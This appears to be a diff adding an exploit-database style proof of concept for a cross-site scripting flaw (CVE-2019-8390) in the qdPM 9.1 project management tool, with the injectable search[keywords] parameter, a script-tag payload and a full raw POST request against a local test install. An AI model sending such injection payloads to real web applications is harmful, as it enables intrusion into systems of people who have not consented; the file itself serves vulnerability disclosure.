@@ -1,0 +1,36 @@
+===========================================================================================
+# Exploit Title: qdPM 9.1 - 'search[keywords]' XSS Injection
+# CVE: CVE-2019-8390
+# Date: 14-02-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: http://qdpm.net
+# Software Link: http://qdpm.net/download-qdpm-free-project-management
+# Version: v9.1
+# Category: Webapps
+# Tested on: Wamp64, @Win
+# Software description:
+  Free project management tool for small team
+  qdPM is a free web-based project management tool suitable for a small
+team working on multiple projects.
+  It is fully configurable. You can easy manage Projects, Tasks and People.
+Customers interact
+  using a Ticket System that is integrated into Task management.
+===========================================================================================
+# POC - XSS
+# Parameters : search[keywords]
+# Attack Pattern : e"><script>zi2u(9111)</script>
+# POST Request : http://localhost/qdpm/index.php/configuration
+===========================================================================================
+POST /qdpm/index.php/users HTTP/1.1
+Content-Length: 73
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost/qdPM/
+Cookie: qdPM8=se4u27u8rbs04mo61f138b5k3d; sidebar_closed=1
+Host: localhost
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML,
+like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+search[keywords]=e"><script>zi2u(9111)</script>&search_by_extrafields[]=9
